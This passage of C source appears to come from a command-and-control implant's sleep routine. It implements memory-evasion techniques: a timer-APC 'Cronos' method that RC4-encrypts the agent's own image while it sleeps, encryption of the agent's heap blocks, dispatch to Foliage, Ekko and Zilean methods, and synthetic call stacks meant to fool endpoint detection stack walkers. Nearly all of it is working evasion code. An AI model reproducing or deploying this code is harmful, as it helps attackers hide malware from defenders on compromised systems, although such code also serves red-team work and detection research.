 * @param Key     16-byte key generated fresh each sleep cycle.
 * @param KeyLen  Length of Key (should be 16).
 */
VOID HeapEncryptDecrypt(
    IN PUCHAR Key,
    IN ULONG  KeyLen
) {
    PVOID                HeapHandle = NtProcessHeap();
    RTL_HEAP_WALK_ENTRY  Entry      = { 0 };
    NTSTATUS             Status;

    if ( ! Instance->Win32.RtlWalkHeap ) {
        return;
    }

    while ( NT_SUCCESS( Status = Instance->Win32.RtlWalkHeap( HeapHandle, &Entry ) ) ) {
        if ( ( Entry.Flags & RTL_HEAP_BUSY )   &&
               Entry.DataAddress != NULL        &&
               Entry.DataSize    > HEAP_SENTINEL_SIZE &&
               HEAP_HAS_SENTINEL( Entry.DataAddress ) )
        {
            /* Encrypt only the user-data region past the sentinel header.
             * The sentinel bytes stay in the clear so the decrypt walk
             * can still identify tagged blocks. */
            HeapXorBlock(
                (PUCHAR) Entry.DataAddress + HEAP_SENTINEL_SIZE,
                Entry.DataSize - HEAP_SENTINEL_SIZE,
                Key,
                KeyLen
            );
        }
    }
}

/*!
 * @brief
 *  Context block shared between the main thread and the Cronos APC callback.
 *  Allocated on the main thread's stack; the callback pointer is passed via
 *  NtSetTimer's TimerContext parameter.
 */
typedef struct _CRONOS_CTX
{
    ULONG    TimeOut;   /* sleep duration in milliseconds */
    PVOID    ImgBase;   /* agent image base */
    ULONG    ImgSize;   /* agent image size */
    PVOID    TxtBase;   /* .text section base (may equal ImgBase) */
    ULONG    TxtSize;   /* .text section size */
    ULONG    Protect;   /* desired protection on .text after decrypt */
    UCHAR    Key[ 16 ]; /* RC4-style key (SystemFunction032 is symmetric) */
    USTRING  KeyStr;    /* USTRING wrapper around Key */
    USTRING  ImgStr;    /* USTRING wrapper around ImgBase/ImgSize */
    BOOL     Done;      /* set to TRUE after decrypt completes */
} CRONOS_CTX, *PCRONOS_CTX;

/*!
 * @brief
 *  Timer APC callback invoked on the main thread when the waitable timer
 *  fires.  Runs entirely within the calling thread's alertable-wait context —
 *  no suspended threads, no new thread creation.
 *
 *  Sequence:
 *    1. Change image protection to RW.
 *    2. RC4-encrypt the image (SystemFunction032 — symmetric).
 *    3. Non-alertable sleep for the requested duration.
 *    4. RC4-decrypt the image (same call, symmetric cipher).
 *    5. Restore .text protection.
 *    6. Signal Done so the caller can detect completion.
 *
 *  Works identically on x64 and x86 — no architecture-specific code.
 *
 * @param ApcContext  Pointer to CRONOS_CTX allocated on the caller's stack.
 * @param LowValue    Timer expiry (low DWORD) — unused.
 * @param HighValue   Timer expiry (high DWORD) — unused.
 */
VOID NTAPI CronosCallback(
    IN PVOID ApcContext,
    IN ULONG LowValue,
    IN LONG  HighValue
) {
    PCRONOS_CTX Ctx      = ( PCRONOS_CTX ) ApcContext;
    ULONG       OldProt  = 0;

    /* Step 1 — make agent image writable before encryption */
    Instance->Win32.VirtualProtect( Ctx->ImgBase, Ctx->ImgSize, PAGE_READWRITE, &OldProt );

    /* Step 2 — encrypt: SystemFunction032 is RC4; calling it again decrypts */
    Instance->Win32.SystemFunction032( &Ctx->ImgStr, &Ctx->KeyStr );

    /* Step 3 — non-alertable sleep so we don't process further APCs */
    Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), Ctx->TimeOut, FALSE );

    /* Step 4 — decrypt (same RC4 call, symmetric) */
    Instance->Win32.SystemFunction032( &Ctx->ImgStr, &Ctx->KeyStr );

    /* Step 5 — restore .text protection */
    Instance->Win32.VirtualProtect( Ctx->TxtBase, Ctx->TxtSize, Ctx->Protect, &OldProt );

    /* Step 6 — signal completion */
    Ctx->Done = TRUE;

    ( VOID ) LowValue;
    ( VOID ) HighValue;
}

/*!
 * @brief
 *  Cronos-style sleep obfuscation (ARC-03).
 *
 *  Schedules a single NtSetTimer APC on the calling thread, then enters an
 *  alertable wait.  When the timer fires the APC callback runs on the same
 *  thread — encrypting the image, sleeping for @p TimeOut ms, then
 *  decrypting — without ever suspending a thread.
 *
 *  Avoids the CreateRemoteThread-on-suspended-thread detection pattern
 *  triggered by Foliage and the timer-pool approaches used by Ekko/Zilean.
 *
 * @param TimeOut  Sleep duration in milliseconds.
 * @return TRUE on success, FALSE if any NT call fails.
 */
BOOL CronosObf(
    _In_ ULONG TimeOut
) {
#if _WIN64

    HANDLE      hTimer  = NULL;
    CRONOS_CTX  Ctx     = { 0 };
    LARGE_INTEGER DueTime = { 0 }; /* 0 = fire immediately */
    NTSTATUS    NtStatus = STATUS_SUCCESS;
    BOOL        Success  = FALSE;

    /* ------------------------------------------------------------------ */
    /*  Populate context block                                              */
    /* ------------------------------------------------------------------ */
    Ctx.TimeOut  = TimeOut;
    Ctx.ImgBase  = Instance->Session.ModuleBase;
    Ctx.ImgSize  = Instance->Session.ModuleSize;
    Ctx.Protect  = PAGE_EXECUTE_READWRITE;

    if ( Instance->Session.TxtBase && Instance->Session.TxtSize ) {
        Ctx.TxtBase = Instance->Session.TxtBase;
        Ctx.TxtSize = Instance->Session.TxtSize;
        Ctx.Protect = PAGE_EXECUTE_READ;
    } else {
        Ctx.TxtBase = Ctx.ImgBase;
        Ctx.TxtSize = Ctx.ImgSize;
    }

    /* generate a random 16-byte RC4 key */
    for ( BYTE i = 0; i < 16; i++ ) {
        Ctx.Key[ i ] = RandomNumber32();
    }

    Ctx.KeyStr.Buffer        = Ctx.Key;
    Ctx.KeyStr.Length        = Ctx.KeyStr.MaximumLength = sizeof( Ctx.Key );
    Ctx.ImgStr.Buffer        = Ctx.ImgBase;
    Ctx.ImgStr.Length        = Ctx.ImgStr.MaximumLength = Ctx.ImgSize;
    Ctx.Done = FALSE;

    /* ------------------------------------------------------------------ */
    /*  Create a synchronisation timer (auto-resets after each signal)     */
    /* ------------------------------------------------------------------ */
    if ( ! NT_SUCCESS( NtStatus = Instance->Win32.NtCreateTimer(
        &hTimer, TIMER_ALL_ACCESS, NULL, SynchronizationTimer ) ) )
    {
        PRINTF( "NtCreateTimer failed: %lx\n", NtStatus )
        goto LEAVE;
    }

    /* ------------------------------------------------------------------ */
    /*  Arm the timer to fire immediately, registering our APC callback    */
    /* ------------------------------------------------------------------ */
    if ( ! NT_SUCCESS( NtStatus = Instance->Win32.NtSetTimer(
        hTimer, &DueTime,
        C_PTR( CronosCallback ), &Ctx,
        FALSE, 0, NULL ) ) )
    {
        PRINTF( "NtSetTimer failed: %lx\n", NtStatus )
        goto LEAVE;
    }

    /*
     * Enter an alertable wait on the timer.  The kernel queues our APC as
     * soon as DueTime elapses (immediately).  The APC dispatcher:
     *   - calls CronosCallback (encrypt → sleep → decrypt)
     *   - returns STATUS_USER_APC or STATUS_SUCCESS to us here
     * Both are acceptable — the callback has already completed.
     */
    NtStatus = SysNtWaitForSingleObject( hTimer, TRUE, NULL );
    if ( NT_SUCCESS( NtStatus ) || NtStatus == (NTSTATUS)STATUS_USER_APC ) {
        Success = Ctx.Done;
    }

    if ( ! Success ) {
        PRINTF( "CronosObf: callback did not complete (NtStatus=%lx Done=%d)\n",
                NtStatus, Ctx.Done )
    }

LEAVE:
    if ( hTimer ) {
        Instance->Win32.NtCancelTimer( hTimer, NULL );
        SysNtClose( hTimer );
        hTimer = NULL;
    }

    /* wipe key from stack */
    RtlSecureZeroMemory( Ctx.Key, sizeof( Ctx.Key ) );

    return Success;

#else /* x86 */

    HANDLE      hTimer  = NULL;
    CRONOS_CTX  Ctx     = { 0 };
    LARGE_INTEGER DueTime = { 0 }; /* 0 = fire immediately */
    NTSTATUS    NtStatus = STATUS_SUCCESS;
    BOOL        Success  = FALSE;

    Ctx.TimeOut  = TimeOut;
    Ctx.ImgBase  = Instance->Session.ModuleBase;
    Ctx.ImgSize  = Instance->Session.ModuleSize;
    Ctx.Protect  = PAGE_EXECUTE_READWRITE;

    if ( Instance->Session.TxtBase && Instance->Session.TxtSize ) {
        Ctx.TxtBase = Instance->Session.TxtBase;
        Ctx.TxtSize = Instance->Session.TxtSize;
        Ctx.Protect = PAGE_EXECUTE_READ;
    } else {
        Ctx.TxtBase = Ctx.ImgBase;
        Ctx.TxtSize = Ctx.ImgSize;
    }

    for ( BYTE i = 0; i < 16; i++ ) {
        Ctx.Key[ i ] = RandomNumber32();
    }

    Ctx.KeyStr.Buffer        = Ctx.Key;
    Ctx.KeyStr.Length        = Ctx.KeyStr.MaximumLength = sizeof( Ctx.Key );
    Ctx.ImgStr.Buffer        = Ctx.ImgBase;
    Ctx.ImgStr.Length        = Ctx.ImgStr.MaximumLength = Ctx.ImgSize;
    Ctx.Done = FALSE;

    if ( ! NT_SUCCESS( NtStatus = Instance->Win32.NtCreateTimer(
        &hTimer, TIMER_ALL_ACCESS, NULL, SynchronizationTimer ) ) )
    {
        PRINTF( "NtCreateTimer failed: %lx\n", NtStatus )
        goto LEAVE_X86;
    }

    if ( ! NT_SUCCESS( NtStatus = Instance->Win32.NtSetTimer(
        hTimer, &DueTime,
        C_PTR( CronosCallback ), &Ctx,
        FALSE, 0, NULL ) ) )
    {
        PRINTF( "NtSetTimer failed: %lx\n", NtStatus )
        goto LEAVE_X86;
    }

    NtStatus = SysNtWaitForSingleObject( hTimer, TRUE, NULL );
    if ( NT_SUCCESS( NtStatus ) || NtStatus == (NTSTATUS)STATUS_USER_APC ) {
        Success = Ctx.Done;
    }

    if ( ! Success ) {
        PRINTF( "CronosObf/x86: callback did not complete (NtStatus=%lx Done=%d)\n",
                NtStatus, Ctx.Done )
    }

LEAVE_X86:
    if ( hTimer ) {
        Instance->Win32.NtCancelTimer( hTimer, NULL );
        SysNtClose( hTimer );
        hTimer = NULL;
    }

    RtlSecureZeroMemory( Ctx.Key, sizeof( Ctx.Key ) );

    return Success;

#endif
}

UINT32 SleepTime(
    VOID
) {
    UINT32     SleepTime    = Instance->Config.Sleeping * 1000;
    UINT32     MaxVariation = ( Instance->Config.Jitter * SleepTime ) / 100;
    ULONG      Rand         = 0;
    UINT32     WorkingHours = Instance->Config.Transport.WorkingHours;
    SYSTEMTIME SystemTime   = { 0 };
    WORD       StartHour    = 0;
    WORD       StartMinute  = 0;
    WORD       EndHour      = 0;
    WORD       EndMinute    = 0;

    if ( ! InWorkingHours() )
    {
        /*
         * we are no longer in working hours,
         * if the SleepTime is 0, then we will assume the operator is performing some "important" task right now,
         * so we will ignore working hours, and we won't sleep
         * if the SleepTime is not 0, we will sleep until we are in working hours again
         */
        if ( SleepTime )
        {
            // calculate how much we need to sleep until we reach the start of the working hours
            SleepTime = 0;

            StartHour   = ( WorkingHours >> 17 ) & 0b011111;
            StartMinute = ( WorkingHours >> 11 ) & 0b111111;
            EndHour     = ( WorkingHours >>  6 ) & 0b011111;
            EndMinute   = ( WorkingHours >>  0 ) & 0b111111;

            Instance->Win32.GetLocalTime(&SystemTime);

            if ( SystemTime.wHour == EndHour && SystemTime.wMinute > EndMinute || SystemTime.wHour > EndHour )
            {
                // seconds until 00:00
                SleepTime += ( 24 - SystemTime.wHour - 1 ) * 60 + ( 60 - SystemTime.wMinute );
                // seconds until start of working hours from 00:00
                SleepTime += StartHour * 60 + StartMinute;
            }
            else
            {
                // seconds until start of working hours from current time
                SleepTime += ( StartHour - SystemTime.wHour ) * 60 + ( StartMinute - SystemTime.wMinute );
            }
            SleepTime *= 1000;
        }
    }
    // MaxVariation will be non-zero if sleep jitter was specified
    else if ( MaxVariation )
    {
        Rand = RandomNumber32();
        Rand = Rand % MaxVariation;

        if ( RandomBool() ) {
            SleepTime += Rand;
        } else {
            SleepTime -= Rand;
        }
    }

    return SleepTime;
}

VOID SleepObf(
    VOID
) {
    UINT32 TimeOut   = SleepTime();
    DWORD  Technique = Instance->Config.Implant.SleepMaskTechnique;

    /* don't do any sleep obf. waste of resources */
    if ( TimeOut == 0 ) {
        return;
    }

#if _WIN64

    if ( Instance->Threads ) {
        PRINTF( "Can't sleep obf. Threads running: %d\n", Instance->Threads )
        Technique = 0;
    }

    /* ARC-04: generate a per-sleep heap encryption key and encrypt all
     * sentinel-tagged heap blocks before entering the sleep technique.
     * Only agent-owned allocations (via MmHeapAlloc) carry the sentinel;
     * system/library allocations are left intact.
     * Controlled by the HeapEnc config flag (default: TRUE). */
    UCHAR HeapKey[ 16 ]  = { 0 };
    BOOL  DoHeapEncrypt  = Instance->Config.Implant.HeapEnc &&
                           ( Technique != SLEEPOBF_NO_OBF ) &&
                           ( Instance->Win32.RtlWalkHeap  != NULL );

    if ( DoHeapEncrypt ) {
        for ( BYTE i = 0; i < 16; i++ ) {
            HeapKey[ i ] = (UCHAR) RandomNumber32();
        }
        PUTS( "[ARC-04] Encrypting heap before sleep" )
        HeapEncryptDecrypt( HeapKey, sizeof( HeapKey ) );
    }

    switch ( Technique )
    {
        case SLEEPOBF_FOLIAGE: {
            SLEEP_PARAM Param = { 0 };

            if ( ( Param.Master = Instance->Win32.ConvertThreadToFiberEx( &Param, 0 ) ) ) {
                if ( ( Param.Slave = Instance->Win32.CreateFiberEx( 0x1000 * 6, 0, 0, C_PTR( FoliageObf ), &Param ) ) ) {
                    Param.TimeOut = TimeOut;
                    Instance->Win32.SwitchToFiber( Param.Slave );
                    Instance->Win32.DeleteFiber( Param.Slave );
                }
                Instance->Win32.ConvertFiberToThread( );
            }
            break;
        }

        /* timer api based sleep obfuscation */
        case SLEEPOBF_EKKO:
        case SLEEPOBF_ZILEAN: {
            if ( ! TimerObf( TimeOut, Technique ) ) {
                goto DEFAULT;
            }
            break;
        }

        /* ARC-03: Cronos — timer-APC on calling thread, no thread suspension */
        case SLEEPOBF_CRONOS: {
            if ( ! CronosObf( TimeOut ) ) {
                goto DEFAULT;
            }
            break;
        }

        /* default — plain sleep with optional ARC-02 synthetic call stack */
        DEFAULT: case SLEEPOBF_NO_OBF: {}; default: {
            if ( Instance->Config.Implant.StackSpoof ) {
                /* ARC-02: build synthetic call-stack frames on a shadow stack
                 * so EDR stack walkers see a plausible kernel32 → ntdll chain. */
                SYNTH_STACK_CTX SynthCtx = { 0 };

                if ( SynthStackInit( &SynthCtx ) && SynthStackPrepare( &SynthCtx ) ) {
                    PUTS( "[ARC-02] Sleeping with synthetic call stack" )
                    SynthStackSleep(
                        Instance->Win32.WaitForSingleObjectEx,
                        NtCurrentProcess(),
                        TimeOut,
                        FALSE,
                        &SynthCtx
                    );
                    SynthStackFree( &SynthCtx );
                } else {
                    PUTS( "[ARC-02] Synthetic stack setup failed, falling back to SpoofFunc" )
                    SynthStackFree( &SynthCtx );
                    SpoofFunc(
                        Instance->Modules.Kernel32,
                        IMAGE_SIZE( Instance->Modules.Kernel32 ),
                        Instance->Win32.WaitForSingleObjectEx,
                        NtCurrentProcess(),
                        C_PTR( TimeOut ),
                        FALSE
                    );
                }
            } else {
                SpoofFunc(
                    Instance->Modules.Kernel32,
                    IMAGE_SIZE( Instance->Modules.Kernel32 ),
                    Instance->Win32.WaitForSingleObjectEx,
                    NtCurrentProcess(),
                    C_PTR( TimeOut ),
                    FALSE
                );
            }
        }
    }

    /* ARC-04: decrypt heap after waking up, then wipe the key from the stack */
    if ( DoHeapEncrypt ) {
        PUTS( "[ARC-04] Decrypting heap after sleep" )
        HeapEncryptDecrypt( HeapKey, sizeof( HeapKey ) );
        RtlSecureZeroMemory( HeapKey, sizeof( HeapKey ) );
    }

#else

    /* ARC-04 (x86): same sentinel-based heap encryption as x64.
     * Cronos on x86 does not use thread suspension, so heap encryption
     * is safe to perform before/after the sleep. */
    UCHAR HeapKey[ 16 ]  = { 0 };
    BOOL  DoHeapEncrypt  = Instance->Config.Implant.HeapEnc &&
                           ( Technique != SLEEPOBF_NO_OBF ) &&
                           ( Instance->Win32.RtlWalkHeap  != NULL );

    if ( DoHeapEncrypt ) {
        for ( BYTE i = 0; i < 16; i++ ) {
            HeapKey[ i ] = (UCHAR) RandomNumber32();
        }
        PUTS( "[ARC-04/x86] Encrypting heap before sleep" )
        HeapEncryptDecrypt( HeapKey, sizeof( HeapKey ) );
    }

    /* x86: dispatch on technique, then fall back to ARC-02 / plain sleep */
    switch ( Technique )
    {
        /* ARC-03: Cronos — timer-APC on calling thread, no thread suspension */
        case SLEEPOBF_CRONOS: {
            if ( CronosObf( TimeOut ) ) {
                break;
            }
            /* fall through to default on failure */
        }

        /* default — ARC-02 synthetic call stack or plain sleep */
        default: {
            if ( Instance->Config.Implant.StackSpoof ) {
                SYNTH_STACK_CTX_X86 SynthCtx86 = { 0 };

                if ( SynthStackInit86( &SynthCtx86 ) && SynthStackPrepare86( &SynthCtx86 ) ) {
                    PUTS( "[ARC-02/x86] Sleeping with synthetic call stack" )
                    SynthStackSleep86(
                        Instance->Win32.WaitForSingleObjectEx,
                        NtCurrentProcess(),
                        TimeOut,
                        FALSE,
                        &SynthCtx86
                    );
                    SynthStackFree86( &SynthCtx86 );
                } else {
                    SynthStackFree86( &SynthCtx86 );
                    Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), TimeOut, FALSE );
                }
            } else {
                Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), TimeOut, FALSE );
            }
        }
    }

    /* ARC-04/x86: decrypt heap after waking up */
    if ( DoHeapEncrypt ) {
        PUTS( "[ARC-04/x86] Decrypting heap after sleep" )
        HeapEncryptDecrypt( HeapKey, sizeof( HeapKey ) );
        RtlSecureZeroMemory( HeapKey, sizeof( HeapKey ) );
    }

#endif

}
